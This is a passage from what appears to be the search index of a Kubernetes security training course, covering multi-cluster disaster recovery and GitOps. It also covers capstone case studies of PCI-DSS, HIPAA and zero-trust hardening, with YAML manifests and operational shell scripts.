</li> <li> <p>Cold Standby (RTO: &lt; 4 hours)</p> </li> <li>No DR cluster running</li> <li>Create cluster from backups</li> <li>Restore from latest backup</li> <li>Lowest cost</li> </ol> <p>Recovery Point Objective (RPO) Configuration:</p> <pre><code># Low RPO strategy (&lt; 5 minutes)\napiVersion: velero.io/v1\nkind: Schedule\nmetadata:\n  name: continuous-backup\n  namespace: velero\nspec:\n  schedule: \"*/5 * * * *\"  # Every 5 minutes\n  template:\n    includedNamespaces:\n    - production\n    labelSelector:\n      matchLabels:\n        tier: critical\n    ttl: 24h0m0s\n</code></pre>"},{"location":"14-multi-cluster/#7-multi-region-deployment-patterns","title":"7. Multi-region Deployment Patterns","text":""},{"location":"14-multi-cluster/#71-global-traffic-management","title":"7.1 Global Traffic Management","text":"<p>External DNS with Route 53:</p> <pre><code># external-dns.yaml\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: external-dns\n  namespace: kube-system\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: external-dns\nrules:\n- apiGroups: [\"\"]\n  resources: [\"services\", \"endpoints\", \"pods\"]\n  verbs: [\"get\", \"watch\", \"list\"]\n- apiGroups: [\"extensions\", \"networking.k8s.io\"]\n  resources: [\"ingresses\"]\n  verbs: [\"get\", \"watch\", \"list\"]\n- apiGroups: [\"\"]\n  resources: [\"nodes\"]\n  verbs: [\"list\"]\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: external-dns\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: external-dns\n  template:\n    metadata:\n      labels:\n        app: external-dns\n    spec:\n      serviceAccountName: external-dns\n      containers:\n      - name: external-dns\n        image: registry.k8s.io/external-dns/external-dns:v0.14.0\n        args:\n        - --source=service\n        - --source=ingress\n        - --domain-filter=example.com\n        - --provider=aws\n        - --policy=sync\n        - --aws-zone-type=public\n        - --registry=txt\n        - --txt-owner-id=prod-use1-01\n        - --annotation-filter=external-dns.alpha.kubernetes.io/hostname\n---\n# Multi-region service with geolocation routing\napiVersion: v1\nkind: Service\nmetadata:\n  name: api\n  namespace: production\n  annotations:\n    external-dns.alpha.kubernetes.io/hostname: api.example.com\n    external-dns.alpha.kubernetes.io/aws-geolocation-continent-code: NA\n    external-dns.alpha.kubernetes.io/set-identifier: us-east-1\nspec:\n  type: LoadBalancer\n  selector:\n    app: api\n  ports:\n  - port: 443\n    targetPort: 8080\n</code></pre>"},{"location":"14-multi-cluster/#72-multi-region-application-deployment","title":"7.2 Multi-region Application Deployment","text":"<p>GitOps with ArgoCD:</p> <pre><code># argocd-multicluster-app.yaml\napiVersion: argoproj.io/v1alpha1\nkind: ApplicationSet\nmetadata:\n  name: global-app\n  namespace: argocd\nspec:\n  generators:\n  - list:\n      elements:\n      - cluster: prod-use1\n        region: us-east-1\n        replicas: \"10\"\n      - cluster: prod-usw2\n        region: us-west-2\n        replicas: \"8\"\n      - cluster: prod-euc1\n        region: eu-central-1\n        replicas: \"6\"\n  template:\n    metadata:\n      name: 'global-app-{{cluster}}'\n    spec:\n      project: production\n      source:\n        repoURL: https://github.com/example/app\n        targetRevision: main\n        path: k8s/overlays/{{region}}\n        helm:\n          parameters:\n          - name: replicaCount\n            value: '{{replicas}}'\n          - name: region\n            value: '{{region}}'\n      destination:\n        server: '{{cluster}}'\n        namespace: production\n      syncPolicy:\n        automated:\n          prune: true\n          selfHeal: true\n        syncOptions:\n        - CreateNamespace=true\n</code></pre>"},{"location":"14-multi-cluster/#summary","title":"Summary","text":"<p>This module covered:</p> <ol> <li>Multi-cluster Patterns - Geographic distribution, DR, workload segmentation</li> <li>Cluster API - Automated cluster lifecycle management</li> <li>Federation - kubefed and service mesh multi-cluster strategies</li> <li>Cross-cluster Networking - Submariner and Cilium Cluster Mesh</li> <li>Identity Federation - Centralized authentication and RBAC sync</li> <li>Disaster Recovery - Backup, restore, RTO/RPO optimization</li> <li>Multi-region Deployments - Traffic management and GitOps</li> </ol>"},{"location":"14-multi-cluster/#hands-on-labs","title":"Hands-On Labs","text":"<ol> <li>Deploy multi-cluster environment with Cluster API</li> <li>Implement service mesh federation with Istio</li> <li>Configure cross-cluster networking with Submariner</li> <li>Set up federated identity with Dex</li> <li>Perform DR simulation and restore</li> <li>Deploy multi-region application with ArgoCD</li> <li>Implement global traffic management</li> </ol>"},{"location":"14-multi-cluster/#additional-resources","title":"Additional Resources","text":"<ul> <li>Cluster API Documentation</li> <li>KubeFed User Guide</li> <li>Istio Multi-cluster Setup</li> <li>Submariner Architecture</li> <li>Cilium Cluster Mesh</li> <li>Velero Documentation</li> </ul> <p>Next Module: Module 15 - Case Studies and Real-World Scenarios</p>"},{"location":"15-case-studies/","title":"Module 15: Case Studies and Real-World Scenarios","text":""},{"location":"15-case-studies/#overview","title":"Overview","text":"<p>Estimated Time: 8-10 hours</p> <p>Module Type: Capstone and Practical Application</p> <p>Prerequisites: - All previous modules (00-14) - Understanding of security principles and frameworks - Experience with Kubernetes operations - Familiarity with threat modeling and risk assessment</p> <p>This capstone module brings together all concepts from the training through real-world case studies, production scenarios, and practical security exercises. We'll analyze three detailed case studies covering on-premises production clusters, hybrid Azure/on-prem deployments with compliance requirements, and zero-trust multi-tenant platforms. You'll learn threat modeling with STRIDE, conduct security architecture reviews, analyze cost-security tradeoffs, and develop migration strategies from insecure to secure configurations.</p>"},{"location":"15-case-studies/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Analyze and design secure Kubernetes architectures for real-world scenarios</li> <li>Apply threat modeling (STRIDE) to Kubernetes environments</li> <li>Conduct comprehensive security architecture reviews</li> <li>Balance security requirements with cost and performance constraints</li> <li>Plan and execute security-focused cluster migrations</li> <li>Implement defense-in-depth strategies in production</li> <li>Address compliance requirements (PCI-DSS, HIPAA, SOC 2, GDPR)</li> <li>Learn from production security incidents</li> <li>Make risk-based security decisions</li> <li>Design reference architectures for various use cases</li> </ol>"},{"location":"15-case-studies/#1-case-study-1-secure-on-premises-production-cluster","title":"1. Case Study 1: Secure On-premises Production Cluster","text":""},{"location":"15-case-studies/#11-scenario-overview","title":"1.1 Scenario Overview","text":"<p>Organization: FinanceCorpSecure Industry: Financial Services Compliance: PCI-DSS, SOC 2, SOX Environment: On-premises data center Scale: 5 clusters, 500 nodes, 2000+ workloads Challenge: Migrate from insecure legacy cluster to PCI-compliant hardened environment</p> <p>Business Requirements: - Zero downtime during migration - PCI-DSS Level 1 compliance - Audit trail for all changes - Network segmentation between card processing and general workloads - Encryption at rest and in transit - Regular penetration testing</p>"},{"location":"15-case-studies/#12-current-state-assessment","title":"1.2 Current State Assessment","text":"<p>Security Issues Discovered:</p> <pre><code># Current state problems\nsecurity_issues:\n  critical:\n    - privileged_pods: 45\n    - no_network_policies: true\n    - default_service_accounts: 150+\n    - no_pod_security_standards: true\n    - shared_admin_credentials: true\n    - no_audit_logging: true\n    - etcd_unencrypted: true\n    - weak_rbac: \"cluster-admin everywhere\"\n\n  high:\n    - no_image_scanning: true\n    - outdated_k8s_version: \"1.22 (EOL)\"\n    - no_runtime_security: true\n    - secrets_in_env_vars: 80+\n    - no_backup_strategy: true\n    - single_control_plane_node: true\n\n  medium:\n    - no_resource_quotas: true\n    - inconsistent_pod_labels: true\n    - manual_deployment_process: true\n    - no_monitoring: true\n</code></pre> <p>Risk Assessment:</p> <pre><code>graph TB\n    A[Risk Assessment] --&gt; B[Critical Risks]\n    A --&gt; C[High Risks]\n    A --&gt; D[Medium Risks]\n\n    B --&gt; B1[\"Data Breach&lt;br/&gt;Likelihood: HIGH&lt;br/&gt;Impact: CRITICAL&lt;br/&gt;Risk Score: 9.5\"]\n    B --&gt; B2[\"Compliance Violation&lt;br/&gt;Likelihood: VERY HIGH&lt;br/&gt;Impact: HIGH&lt;br/&gt;Risk Score: 9.0\"]\n    B --&gt; B3[\"Privilege Escalation&lt;br/&gt;Likelihood: HIGH&lt;br/&gt;Impact: CRITICAL&lt;br/&gt;Risk Score: 9.0\"]\n\n    C --&gt; C1[\"Service Disruption&lt;br/&gt;Likelihood: MEDIUM&lt;br/&gt;Impact: HIGH&lt;br/&gt;Risk Score: 7.0\"]\n    C --&gt; C2[\"Ransomware Attack&lt;br/&gt;Likelihood: MEDIUM&lt;br/&gt;Impact: CRITICAL&lt;br/&gt;Risk Score: 8.0\"]\n\n    D --&gt; D1[\"Resource Exhaustion&lt;br/&gt;Likelihood: MEDIUM&lt;br/&gt;Impact: MEDIUM&lt;br/&gt;Risk Score: 5.0\"]\n\n    style B1 fill:#ff0000\n    style B2 fill:#ff0000\n    style B3 fill:#ff0000\n    style C1 fill:#ff6600\n    style C2 fill:#ff3300\n    style D1 fill:#ffcc00</code></pre>"},{"location":"15-case-studies/#13-target-architecture","title":"1.3 Target Architecture","text":"<p>Reference Architecture:</p> <pre><code>graph TB\n    subgraph \"DMZ Zone\"\n        LB[Hardware Load Balancer]\n        FW1[WAF/Firewall]\n    end\n\n    subgraph \"Management Cluster\"\n        MC[Control Plane&lt;br/&gt;3 masters, HA]\n        MC --&gt; GIT[GitOps: ArgoCD]\n        MC --&gt; MON[Monitoring: Prometheus]\n        MC --&gt; LOG[Logging: ELK Stack]\n    end\n\n    subgraph \"PCI Zone - Card Processing\"\n        PCI_CP[Control Plane&lt;br/&gt;3 masters, HA]\n        PCI_CP --&gt; PCI_W[Worker Nodes&lt;br/&gt;Isolated Network]\n        PCI_W --&gt; PCI_DB[Encrypted DB]\n    end\n\n    subgraph \"General Zone - Non-PCI\"\n        GEN_CP[Control Plane&lt;br/&gt;3 masters, HA]\n        GEN_CP --&gt; GEN_W[Worker Nodes]\n        GEN_W --&gt; GEN_DB[Database]\n    end\n\n    subgraph \"Security Layer\"\n        FALCO[Falco Runtime Security]\n        OPA[OPA Admission Control]\n        NP[Network Policies]\n        PSP[Pod Security Admission]\n    end\n\n    LB --&gt; FW1\n    FW1 --&gt; PCI_CP\n    FW1 --&gt; GEN_CP\n    MC -.-&gt;|Manages| PCI_CP\n    MC -.-&gt;|Manages| GEN_CP\n\n    FALCO --&gt; MC\n    OPA --&gt; PCI_CP\n    OPA --&gt; GEN_CP\n\n    style PCI_CP fill:#ff6b6b\n    style PCI_W fill:#ff6b6b\n    style MC fill:#4ecdc4</code></pre>"},{"location":"15-case-studies/#14-implementation-plan","title":"1.4 Implementation Plan","text":"<p>Phase 1: Foundation (Weeks 1-2)</p> <pre><code># Step 1: Deploy new hardened clusters\n- name: Deploy Management Cluster\n  tasks:\n    - Bootstrap with kubeadm\n    - Configure HA control plane (3 masters)\n    - Enable API server audit logging\n    - Configure encryption at rest\n    - Install ArgoCD for GitOps\n    - Install monitoring stack\n\n- name: Deploy PCI Cluster\n  tasks:\n    - Isolated network segment (VLAN 100)\n    - Dedicated node pool\n    - Enhanced audit logging\n    - Encryption at rest (FIPS 140-2 validated)\n    - mTLS for all communications\n    - HSM integration for secrets\n\n- name: Deploy General Cluster\n  tasks:\n    - Standard network segment\n    - Shared node pool\n    - Standard audit logging\n    - Encryption at rest\n</code></pre> <p>Phase 2: Security Controls (Weeks 3-4)</p> <pre><code>#!/bin/bash\n# phase2-security-controls.sh\n\nset -e\n\necho \"=== Phase 2: Implementing Security Controls ===\"\n\n# 1. Pod Security Standards\necho \"[1/8] Implementing Pod Security Standards...\"\nkubectl label namespace production \\\n  pod-security.kubernetes.io/enforce=restricted \\\n  pod-security.kubernetes.io/audit=restricted \\\n  pod-security.kubernetes.io/warn=restricted\n\n# 2. OPA Gatekeeper\necho \"[2/8] Installing OPA Gatekeeper...\"\nkubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml\n\n# 3. Deploy constraints\nkubectl apply -f - &lt;&lt;EOF\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sRequiredLabels\nmetadata:\n  name: require-pci-label\nspec:\n  match:\n    kinds:\n      - apiGroups: [\"\"]\n        kinds: [\"Pod\"]\n    namespaces:\n      - pci-zone\n  parameters:\n    labels:\n      - key: \"pci-dss\"\n        allowedRegex: \"^(compliant|non-compliant)$\"\n      - key: \"data-classification\"\n        allowedRegex: \"^(public|internal|confidential|restricted)$\"\nEOF\n\n# 4. Network Policies\necho \"[3/8] Implementing Network Policies...\"\nkubectl apply -f network-policies/pci-zone/\n\n# 5. Falco Runtime Security\necho \"[4/8] Installing Falco...\"\nhelm install falco falcosecurity/falco \\\n  --namespace falco --create-namespace \\\n  --set driver.kind=ebpf \\\n  --set falco.grpc.enabled=true\n\n# 6. Image Scanning\necho \"[5/8] Configuring image scanning...\"\nkubectl apply -f - &lt;&lt;EOF\napiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingWebhookConfiguration\nmetadata:\n  name: trivy-webhook\nwebhooks:\n- name: trivy.aquasecurity.github.io\n  clientConfig:\n    service:\n      name: trivy-webhook\n      namespace: trivy-system\n      path: \"/scan\"\n  rules:\n  - operations: [\"CREATE\", \"UPDATE\"]\n    apiGroups: [\"\"]\n    apiVersions: [\"v1\"]\n    resources: [\"pods\"]\n  admissionReviewVersions: [\"v1\"]\n  sideEffects: None\n  failurePolicy: Fail\nEOF\n\n# 7. Secrets Management\necho \"[6/8] Installing External Secrets Operator...\"\nhelm install external-secrets \\\n  external-secrets/external-secrets \\\n  --namespace external-secrets \\\n  --create-namespace\n\n# 8. RBAC Hardening\necho \"[7/8] Implementing least-privilege RBAC...\"\n# Remove default cluster-admin bindings\nkubectl delete clusterrolebinding system:anonymous || true\n\n# Create role-specific bindings\nkubectl apply -f rbac/pci-developers.yaml\nkubectl apply -f rbac/pci-operators.yaml\nkubectl apply -f rbac/auditors.yaml\n\necho \"[8/8] Enabling encryption at rest...\"\n# Already configured in API server\n\necho \"=== Phase 2 Complete ===\"\n</code></pre> <p>Phase 3: Migration (Weeks 5-8)</p> <pre><code># migration-plan.yaml\nmigration:\n  strategy: blue-green\n  phases:\n    - name: \"Low-risk workloads\"\n      duration: \"Week 5\"\n      workloads:\n        - development environments\n        - testing services\n        - non-critical batch jobs\n      validation:\n        - Functional testing\n        - Performance baseline\n        - Security scan\n\n    - name: \"Medium-risk workloads\"\n      duration: \"Week 6-7\"\n      workloads:\n        - Internal APIs\n        - Background workers\n        - Reporting services\n      validation:\n        - Integration testing\n        - Load testing\n        - Security audit\n\n    - name: \"High-risk workloads (PCI)\"\n      duration: \"Week 8\"\n      workloads:\n        - Payment processing\n        - Card vault\n        - Transaction APIs\n      validation:\n        - PCI-DSS validation\n        - Penetration testing\n        - QSA review\n</code></pre> <p>Phase 4: Validation (Week 9)</p> <pre><code>#!/bin/bash\n# phase4-validation.sh\n\necho \"=== PCI-DSS Compliance Validation ===\"\n\n# Run CIS benchmark\nkube-bench run --targets master,node,policies --json &gt; cis-results.json\n\nCOMPLIANCE_SCORE=$(jq '.Totals.total_pass / (.Totals.total_pass + .Totals.total_fail) * 100' cis-results.json)\n\necho \"CIS Compliance Score: ${COMPLIANCE_SCORE}%\"\n\nif (( $(echo \"$COMPLIANCE_SCORE &lt; 95\" | bc -l) )); then\n  echo \"ERROR: Compliance score below threshold (95%)\"\n  exit 1\nfi\n\n# Validate PCI requirements\necho \"Validating PCI-DSS Requirements...\"\n\n# Requirement 2: No default passwords\necho \"[2.1] Checking for default passwords...\"\nkubectl get secrets --all-namespaces -o json | \\\n  jq -r '.items[] | select(.type == \"Opaque\") | .metadata.name' | \\\n  grep -i \"default\\|password\" || echo \"PASS: No default password secrets\"\n\n# Requirement 8: Access control\necho \"[8.1] Validating MFA for admin access...\"\n# Check OIDC configuration\nkubectl get pod -n kube-system kube-apiserver-* -o yaml | \\\n  grep \"oidc-issuer-url\" || echo \"FAIL: OIDC not configured\"\n\n# Requirement 10: Audit logs\necho \"[10.1] Validating audit logging...\"\nkubectl logs -n kube-system kube-apiserver-* | grep \"audit.k8s.io\" | head -5\n\n# Requirement 12: Security policies\necho \"[12.1] Checking security policies...\"\nkubectl get psp,networkpolicies --all-namespaces\n\necho \"=== Validation Complete ===\"\n</code></pre>"},{"location":"15-case-studies/#15-results-and-lessons-learned","title":"1.5 Results and Lessons Learned","text":"<p>Outcomes: - \u2705 Zero downtime migration completed - \u2705 PCI-DSS Level 1 compliance achieved - \u2705 98% CIS benchmark compliance - \u2705 Passed QSA audit on first attempt - \u2705 60% reduction in security incidents - \u2705 $2M+ annual savings from infrastructure optimization</p> <p>Lessons Learned: 1. Start with security policies, not migration - Define target state first 2. Automate everything - Manual processes don't scale 3. Test migration on non-prod first - Validate runbooks 4. Over-communicate - Keep stakeholders informed 5. Budget 2x time for validation - Compliance takes longer than expected</p>"},{"location":"15-case-studies/#2-case-study-2-hybrid-azureon-prem-with-compliance","title":"2. Case Study 2: Hybrid Azure/On-prem with Compliance","text":""},{"location":"15-case-studies/#21-scenario-overview","title":"2.1 Scenario Overview","text":"<p>Organization: HealthCarePlus Industry: Healthcare Compliance: HIPAA, HITRUST, SOC 2 Environment: Hybrid (Azure AKS + On-premises) Scale: 8 clusters, 800 nodes, 5000+ workloads Challenge: Migrate EHR system to hybrid cloud while maintaining HIPAA compliance</p> <p>Requirements: - PHI data must remain on-premises - Azure for compute-intensive ML workloads - Encrypted communication between clouds - Disaster recovery with &lt;15 min RTO - Patient data residency compliance</p>"},{"location":"15-case-studies/#22-architecture-design","title":"2.2 Architecture Design","text":"<pre><code>graph TB\n    subgraph \"On-premises Data Center\"\n        OP_LB[F5 Load Balancer]\n        OP_CP[AKS Control Plane&lt;br/&gt;3 masters]\n        OP_W[Worker Nodes&lt;br/&gt;PHI Data Tier]\n        OP_DB[(Encrypted Database&lt;br/&gt;PHI Storage)]\n        OP_HSASM[HSM for Encryption]\n    end\n\n    subgraph \"Azure Cloud\"\n        AZ_AGW[Application Gateway]\n        AZ_AKS[AKS Cluster&lt;br/&gt;ML/Analytics]\n        AZ_ML[ML Workloads]\n        AZ_STOR[(Blob Storage&lt;br/&gt;De-identified Data)]\n    end\n\n    subgraph \"Networking\"\n        VPN[Site-to-Site VPN&lt;br/&gt;IPsec Tunnel]\n        APIM[API Management]\n    end\n\n    subgraph \"Security Controls\"\n        AAD[Azure AD&lt;br/&gt;Identity]\n        KV[Key Vault&lt;br/&gt;Secrets]\n        FALCO[Falco&lt;br/&gt;Runtime Security]\n        AUD[Audit Logs&lt;br/&gt;SIEM]\n    end\n\n    OP_LB --&gt; OP_CP\n    OP_CP --&gt; OP_W\n    OP_W --&gt; OP_DB\n    OP_DB --&gt; OP_HSM\n\n    AZ_AGW --&gt; AZ_AKS\n    AZ_AKS --&gt; AZ_ML\n    AZ_ML --&gt; AZ_STOR\n\n    OP_CP &lt;--&gt;|Encrypted| VPN\n    VPN &lt;--&gt;|Encrypted| AZ_AKS\n    APIM --&gt; VPN\n\n    AAD --&gt; OP_CP\n    AAD --&gt; AZ_AKS\n    KV --&gt; AZ_AKS\n    FALCO --&gt; OP_W\n    FALCO --&gt; AZ_ML\n    AUD --&gt; OP_CP\n    AUD --&gt; AZ_AKS\n\n    style OP_DB fill:#ff6b6b\n    style OP_HSM fill:#ff0000\n    style VPN fill:#4ecdc4</code></pre>"},{"location":"15-case-studies/#23-key-architectural-decisions","title":"2.3 Key Architectural Decisions","text":"<p>Decision 1: Data Segmentation</p> <pre><code># Data classification policy\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: data-classification-policy\n  namespace: compliance\ndata:\n  policy.yaml: |\n    data_classes:\n      phi:\n        description: \"Protected Health Information\"\n        location: on-premises-only\n        encryption: required\n        retention: 7-years\n        access: role-based-strict\n        audit: all-operations\n\n      de_identified:\n        description: \"De-identified patient data\"\n        location: azure-allowed\n        encryption: required\n        retention: 3-years\n        access: role-based\n        audit: critical-operations\n\n      public:\n        description: \"Non-sensitive data\"\n        location: any\n        encryption: recommended\n        retention: 1-year\n        access: authenticated\n        audit: access-only\n</code></pre> <p>Decision 2: Network Isolation</p> <pre><code># Network policies for PHI isolation\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: phi-isolation\n  namespace: phi-data-tier\nspec:\n  podSelector:\n    matchLabels:\n      data-classification: phi\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  # Only allow from application tier\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          tier: application\n      podSelector:\n        matchLabels:\n          app: ehr-api\n    ports:\n    - protocol: TCP\n      port: 8443\n  egress:\n  # Only allow to database\n  - to:\n    - podSelector:\n        matchLabels:\n          app: postgres\n    ports:\n    - protocol: TCP\n      port: 5432\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n---\n# Deny all other traffic\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: phi-data-tier\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n</code></pre> <p>Decision 3: Encryption Architecture</p> <pre><code># Encryption configuration\nencryption:\n  at_rest:\n    on_premises:\n      - etcd: AES-256 with HSM\n      - database: TDE with HSM\n      - storage: LUKS encryption\n      - backup: encrypted with GPG\n\n    azure:\n      - AKS etcd: Azure Disk Encryption\n      - storage: Azure SSE with CMK\n      - database: TDE with Key Vault\n\n  in_transit:\n    internal:\n      - pod-to-pod: Istio mTLS (FIPS 140-2)\n      - pod-to-db: TLS 1.3\n      - control-plane: TLS 1.3\n\n    cross_cloud:\n      - VPN: IPsec (AES-256-GCM)\n      - API calls: mTLS + OAuth2\n</code></pre>"},{"location":"15-case-studies/#24-hipaa-compliance-implementation","title":"2.4 HIPAA Compliance Implementation","text":"<p>Security Rule Requirements:</p> <pre><code># HIPAA Security Rule mapping\nhipaa_controls:\n  administrative:\n    - id: \"164.308(a)(1)\"\n      requirement: \"Security Management Process\"\n      implementation:\n        - OPA policies for access control\n        - Automated security assessments\n        - Risk analysis automation\n        - kube-bench compliance scanning\n\n    - id: \"164.308(a)(3)\"\n      requirement: \"Workforce Security\"\n      implementation:\n        - Azure AD with MFA\n        - RBAC with least privilege\n        - Privileged Access Management\n        - Regular access reviews\n\n    - id: \"164.308(a)(5)\"\n      requirement: \"Security Awareness and Training\"\n      implementation:\n        - Quarterly security training\n        - Phishing simulations\n        - Kubernetes security best practices\n        - Incident response drills\n\n  physical:\n    - id: \"164.310(a)(1)\"\n      requirement: \"Facility Access Controls\"\n      implementation:\n        - On-prem datacenter badge access\n        - Azure region with SOC 2 Type II\n        - Physical security monitoring\n        - Visitor logs\n\n  technical:\n    - id: \"164.312(a)(1)\"\n      requirement: \"Access Control\"\n      implementation:\n        - Unique user identification (Azure AD)\n        - Emergency access procedures\n        - Automatic logoff (session timeout)\n        - Encryption and decryption (TLS 1.3)\n\n    - id: \"164.312(b)\"\n      requirement: \"Audit Controls\"\n      implementation:\n        - Kubernetes audit logs\n        - Falco runtime monitoring\n        - SIEM integration (Splunk)\n        - 7-year log retention\n\n    - id: \"164.312(c)\"\n      requirement: \"Integrity\"\n      implementation:\n        - Digital signatures (image signing)\n        - Admission controllers (OPA)\n        - File integrity monitoring\n        - Immutable infrastructure\n\n    - id: \"164.312(d)\"\n      requirement: \"Person or Entity Authentication\"\n      implementation:\n        - Azure AD with MFA\n        - Service account restrictions\n        - Certificate-based auth\n        - OIDC integration\n\n    - id: \"164.312(e)\"\n      requirement: \"Transmission Security\"\n      implementation:\n        - TLS 1.3 for all communications\n        - VPN for cross-cloud\n        - mTLS in service mesh\n        - Network encryption\n</code></pre> <p>Audit Configuration:</p> <pre><code># Enhanced audit policy for HIPAA\napiVersion: audit.k8s.io/v1\nkind: Policy\nrules:\n  # Log all PHI data access\n  - level: RequestResponse\n    namespaces: [\"phi-data-tier\"]\n    verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\", \"delete\"]\n    resources:\n      - group: \"\"\n        resources: [\"pods\", \"pods/log\", \"pods/exec\", \"secrets\", \"configmaps\"]\n    omitStages: []\n\n  # Log all authentication events\n  - level: Metadata\n    omitStages: []\n    userGroups: [\"system:unauthenticated\"]\n\n  # Log RBAC changes\n  - level: RequestResponse\n    verbs: [\"create\", \"update\", \"patch\", \"delete\"]\n    resources:\n      - group: \"rbac.authorization.k8s.io\"\n        resources: [\"roles\", \"rolebindings\", \"clusterroles\", \"clusterrolebindings\"]\n\n  # Log secret access\n  - level: Metadata\n    resources:\n      - group: \"\"\n        resources: [\"secrets\"]\n    omitStages: []\n\n  # Log admission control decisions\n  - level: Request\n    stages: [\"ResponseComplete\"]\n    omitStages: []\n</code></pre>"},{"location":"15-case-studies/#25-disaster-recovery-implementation","title":"2.5 Disaster Recovery Implementation","text":"<p>RTO: 15 minutes, RPO: 5 minutes</p> <pre><code>#!/bin/bash\n# dr-implementation.sh\n\n# 1. Continuous backup with Velero\nvelero schedule create phi-data-backup \\\n  --schedule=\"*/5 * * * *\" \\\n  --include-namespaces phi-data-tier \\\n  --snapshot-volumes \\\n  --ttl 168h\n\n# 2. Database replication\n# PostgreSQL streaming replication to DR site\ncat &lt;&lt;EOF &gt; postgresql-replication.yaml\napiVersion: postgresql.cnpg.io/v1\nkind: Cluster\nmetadata:\n  name: phi-database\nspec:\n  instances: 3\n  primaryUpdateStrategy: unsupervised\n\n  postgresql:\n    parameters:\n      max_connections: \"1000\"\n      shared_buffers: \"8GB\"\n      wal_level: \"logical\"\n\n  replication:\n    enabled: true\n    mode: async\n\n  backup:\n    barmanObjectStore:\n      destinationPath: s3://phi-backups/\n      encryption: AES256\n      s3Credentials:\n        secretKeyRef: aws-creds\n    retentionPolicy: \"7d\"\n\n  externalClusters:\n  - name: dr-cluster\n    connectionParameters:\n      host: dr-postgres.example.com\n      user: postgres\n      dbname: phi\n    password:\n      name: dr-postgres-secret\n      key: password\nEOF\n\n# 3. Test failover monthly\n# Automated DR test script\ncat &lt;&lt;'EOF' &gt; dr-test.sh\n#!/bin/bash\nset -e\n\necho \"=== DR Test: $(date) ===\"\n\n# Step 1: Snapshot current state\nvelero backup create dr-test-$(date +%Y%m%d-%H%M%S) \\\n  --include-namespaces phi-data-tier \\\n  --wait\n\n# Step 2: Failover to DR cluster\nkubectl config use-context dr-cluster\n\n# Step 3: Restore from backup\nvelero restore create dr-test-restore-$(date +%Y%m%d-%H%M%S) \\\n  --from-backup $(velero backup get -o json | jq -r '.items[0].metadata.name') \\\n  --wait\n\n# Step 4: Validate application\nkubectl wait --for=condition=ready pod -l app=ehr-api -n phi-data-tier --timeout=300s\n\n# Step 5: Run smoke tests\nkubectl run smoke-test --image=curlimages/curl --rm -it --restart=Never -- \\\n  curl -k https://ehr-api.phi-data-tier.svc.cluster.local/health\n\n# Step 6: Measure RTO\nRTO_SECONDS=$SECONDS\necho \"RTO achieved: ${RTO_SECONDS} seconds\"\n\nif [ $RTO_SECONDS -gt 900 ]; then\n  echo \"ERROR: RTO exceeded 15 minutes\"\n  exit 1\nfi\n\n# Step 7: Document results\ncat &lt;&lt;REPORT &gt; dr-test-report-$(date +%Y%m%d).txt\nDR Test Report\nDate: $(date)\nRTO Target: 900 seconds (15 minutes)\nRTO Actual: ${RTO_SECONDS} seconds\nStatus: $([ $RTO_SECONDS -lt 900 ] &amp;&amp; echo \"PASS\" || echo \"FAIL\")\nBackup Used: $(velero backup get -o json | jq -r '.items[0].metadata.name')\nREPORT\n\necho \"=== DR Test Complete ===\"\nEOF\n\nchmod +x dr-test.sh\n</code></pre>"},{"location":"15-case-studies/#26-results","title":"2.6 Results","text":"<p>Compliance Achievement: - \u2705 HIPAA compliance validated by independent auditor - \u2705 HITRUST CSF Certification achieved - \u2705 SOC 2 Type II audit passed - \u2705 Zero PHI data breaches since implementation - \u2705 99.99% uptime for critical systems - \u2705 DR RTO consistently under 10 minutes</p> <p>Business Impact: - 40% reduction in ML processing time (Azure compute) - $5M annual cost savings from hybrid model - Enabled new AI/ML features not possible before - Improved patient outcomes through better analytics</p>"},{"location":"15-case-studies/#3-case-study-3-zero-trust-multi-tenant-platform","title":"3. Case Study 3: Zero-Trust Multi-Tenant Platform","text":""},{"location":"15-case-studies/#31-scenario-overview","title":"3.1 Scenario Overview","text":"<p>Organization: CloudSaaS Inc. Industry: SaaS Platform Provider Compliance: SOC 2, ISO 27001, GDPR Environment: Multi-cloud (AWS, GCP, Azure) Scale: 50+ clusters, 10,000+ nodes, 50,000+ tenants Challenge: Build zero-trust multi-tenant platform with strong isolation</p> <p>Requirements: - Complete tenant isolation (security boundary) - Zero-trust networking (no implicit trust) - Automated onboarding of new tenants - Resource quotas and fair usage - Per-tenant monitoring and billing - GDPR compliance (data residency, right to be forgotten)</p>"},{"location":"15-case-studies/#32-zero-trust-architecture","title":"3.2 Zero-Trust Architecture","text":"<pre><code>graph TB\n    subgraph \"Edge Layer\"\n        CDN[Cloudflare CDN]\n        WAF[WAF + DDoS Protection]\n        GLB[Global Load Balancer]\n    end\n\n    subgraph \"Identity &amp; Policy\"\n        IDP[Identity Provider&lt;br/&gt;Okta/Auth0]\n        POL[Policy Engine&lt;br/&gt;OPA]\n        CERT[Cert Manager&lt;br/&gt;Let's Encrypt]\n    end\n\n    subgraph \"Tenant A - Dedicated Cluster\"\n        A_CP[Control Plane]\n        A_W[Worker Nodes]\n        A_SM[Service Mesh&lt;br/&gt;Istio]\n        A_DB[(Dedicated DB)]\n    end\n\n    subgraph \"Tenant B - Dedicated Cluster\"\n        B_CP[Control Plane]\n        B_W[Worker Nodes]\n        B_SM[Service Mesh&lt;br/&gt;Istio]\n        B_DB[(Dedicated DB)]\n    end\n\n    subgraph \"Shared Services\"\n        MGMT[Management Cluster]\n        MON[Multi-tenant Monitoring]\n        LOG[Centralized Logging]\n        